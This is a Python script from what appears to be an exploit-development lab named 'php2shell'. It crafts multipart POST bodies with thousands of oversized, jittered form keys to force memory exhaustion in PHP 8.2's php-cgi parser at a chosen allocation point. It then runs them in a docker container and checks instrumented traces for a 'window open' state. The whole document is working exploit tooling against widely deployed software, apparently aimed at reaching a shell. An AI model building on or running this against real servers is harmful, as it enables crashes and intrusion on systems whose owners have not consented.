#!/usr/bin/env python3
"""php2shell lab, oom29: mixed-class key climb — make the KEY the drier.

oom28 ground truth (instrumented): at free=0 the first unservable ask dies;
with uniform 4KB keys that is always the next part's transient (pre-commit).
Fix by construction: per-part KEYLEN in {4KB-class, 8KB-class} random —
  * the key becomes the largest recurring unrecycled draw, so chunk
    exhaustion and fresh-chunk growth land ON the key ask most cycles;
  * free-run parity walks all residues (odd free-run + 2-page key =
    post-commit death).
Success: 'TRACE keycommit' with NO matching keyok + fatal.
usage: oom29.py <limit> [nparts] [seed]
"""
import random
import re
import subprocess
import sys

BIN = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"
LIMIT = sys.argv[1] if len(sys.argv) > 1 else "32M"
NPARTS = int(sys.argv[2]) if len(sys.argv) > 2 else 4000
SEED = int(sys.argv[3]) if len(sys.argv) > 3 else 7


def part_seg(i, seglen):
    seg = b"p" + b"K" * (seglen - 2) + (b"%d" % i)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="' + seg + b'[x]"\r\n\r\nv\r\n')


def build():
    rng = random.Random(SEED)
    ps = []
    for i in range(NPARTS):
        # alternate 1-page and 2-page key classes with jitter inside the class
        klass = rng.choice((4020, 4030, 4040, 8050, 8060, 8070))
        ps.append(part_seg(i, klass))
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def run(body):
    subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", "cat > /tmp/body.bin"],
                   input=body, capture_output=True, timeout=120)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "/usr/src/php-8.2.34/sapi/cgi/php-cgi -d memory_limit=%s -d post_max_size=4096M "
           "-d max_input_vars=100000 </tmp/body.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", cmd % (len(body), LIMIT)],
                       capture_output=True, timeout=300)
    rc = r.stdout.decode().strip()
    tr = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                         "cat /tmp/e.log /tmp/o.log"], capture_output=True).stdout.decode("latin1")
    return rc, tr


def main():
    body = build()
    print("oom29 limit=%s parts=%d seed=%d body=%d" % (LIMIT, NPARTS, SEED, len(body)), flush=True)
    rc, tr = run(body)
    commits = re.findall(r"TRACE keycommit stage=1 elem=(\d+) free=(\d+)", tr)
    oks = len(re.findall(r"TRACE keyok", tr))
    fatal = "Allowed memory size" in tr
    key_death = len(commits) > oks
    print("rc=%s fatal=%s commits=%d oks=%d KEY_DEATH=%s" % (rc, fatal, len(commits), oks, key_death))
    if commits:
        print("last_commit:", commits[-1])
    if key_death:
        idx = tr.rfind("TRACE keycommit")
        print("*** KEY DEATH — window open ***")
        print(tr[idx:idx + 500])
    else:
        tail = [l for l in tr.splitlines() if "keycommit" in l or "Allowed" in l or "alloc size" in l]
        print("--- tail ---")
        print("\n".join(tail[-6:]))


if __name__ == "__main__":
    main()
